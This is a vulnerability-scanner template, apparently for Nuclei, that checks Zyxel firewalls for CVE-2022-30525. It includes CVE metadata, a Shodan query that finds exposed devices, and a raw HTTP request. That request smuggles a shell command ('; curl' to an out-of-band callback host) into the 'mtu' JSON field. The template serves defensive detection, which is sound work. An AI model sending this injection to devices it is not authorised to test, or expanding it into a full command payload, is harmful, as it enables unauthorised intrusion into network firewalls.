id: CVE-2022-30525
info:
  name: Zyxel Firewall - OS Command Injection
  author: h1ei1,prajiteshsingh
  severity: critical
  description: The Zyxel Firewall is vulnerable to an OS command injection, which
    could allow an attacker to modify files and execute OS commands on affected devices.
  reference:
  - https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/
  - https://github.com/rapid7/metasploit-framework/pull/16563
  - https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml
  - https://nvd.nist.gov/vuln/detail/CVE-2022-30525
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-30525
    cwe-id: CWE-78
  metadata:
    shodan-query: title:"USG FLEX 100","USG FLEX 100w","USG FLEX 200","USG FLEX 500","USG
      FLEX 700","USG FLEX 50","USG FLEX 50w","ATP100","ATP200","ATP500","ATP700"
    impact: The OS command injection vulnerability in Zyxel firewall could potentially
      allow an attacker to modify files and execute commands, creating a significant
      impact on the device and its security.
    recommendation: It is recommended that users of Zyxel Firewall immediately update
      their firmware to versions 5.21 Patch 2 or later to mitigate the risk of the
      OS command injection vulnerability CVE-2022-30525.
  tags: zyxel,cve,cve2022,firewall,unauth,kev,msf,rce
requests:
- raw:
  - 'POST /ztp/cgi-bin/handler HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":";
    curl {{interactsh-url}};","data":"hi"}

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 500
